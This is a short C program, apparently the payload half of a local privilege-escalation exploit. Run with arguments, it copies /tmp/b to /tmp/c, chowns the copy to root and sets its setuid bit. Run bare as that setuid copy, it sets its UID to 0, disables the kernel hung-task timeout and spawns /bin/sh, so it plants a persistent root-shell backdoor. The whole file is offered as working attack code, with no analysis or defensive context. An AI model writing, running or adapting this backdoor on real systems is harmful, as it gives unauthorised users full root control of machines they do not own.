#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

int main(int argc, char ** argv) {
   // The path to the file you want to change permissions for
    if(argc == 1){
            // Set UID to 0 (root)
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system("echo 0 > /proc/sys/kernel/hung_task_timeout_secs");
        // Execute a shell with elevated privileges
        char *shell = "/bin/sh";
        char *args[] = {shell, NULL};
        execve(shell, args, NULL);

        // If execve fails, it returns -1, and the following line will be executed.
        perror("execve");
    }
    char *filePath = "/tmp/c";
    system("cp /tmp/b /tmp/c");
    // UID and GID for root are typically 0
    uid_t ownerUID = 0; // Root user ID
    gid_t ownerGID = 0; // Root group ID (you can also use -1 if you don't want to change the group)

    if (chown(filePath, ownerUID, ownerGID) == -1) {
        perror("Failed to change file owner to root");
        return 1;
    }

    // Get current permissions
    struct stat st;
    if (stat(filePath, &st) != 0) {
        perror("Failed to get file permissions");
        return 1;
    }

    // Add setuid permission to the current permissions
    mode_t newPermissions = st.st_mode | S_ISUID;

    // Change permissions of the file
    if (chmod(filePath, newPermissions) != 0) {
        perror("Failed to change file permissions");
        return 1;
    }

    printf("Setuid permission added to %s\n", filePath);
    return 0;
}
